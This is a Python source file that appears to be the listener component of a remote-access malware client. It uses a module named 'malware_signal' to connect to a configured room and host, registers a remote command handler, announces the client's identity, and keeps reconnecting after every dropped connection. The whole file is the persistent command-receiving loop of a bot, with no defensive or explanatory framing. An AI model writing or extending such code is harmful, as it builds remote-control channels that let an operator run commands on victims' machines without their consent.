#command/listen/listener.py
import asyncio
from core.data.client import client_id, username
from core.data.config import ROOM, HOST
from malware_signal.signal import SignalClient
from injection_utils.remote_command_handler import RemoteCommandHandler as ReceiverHandler


async def listen_bash_mode():
    retry_delay = 10
    signal = SignalClient(ROOM, client_id, HOST, username=username)
    ReceiverHandler(signal)  # registers handler before messages arrive

    while True:
        try:
            await signal.connect()
            print(f"[+] LISTENING AS {username} : {client_id}")
            await signal.listen()  # blocks while connected

        except asyncio.CancelledError:
            raise
        except Exception as exc:
            print(f"[!] CONNECTION LOST: {exc}")
        finally:
            await signal.close()

        print(f"[!] RECONNECTING IN {retry_delay} seconds")
        await asyncio.sleep(retry_delay)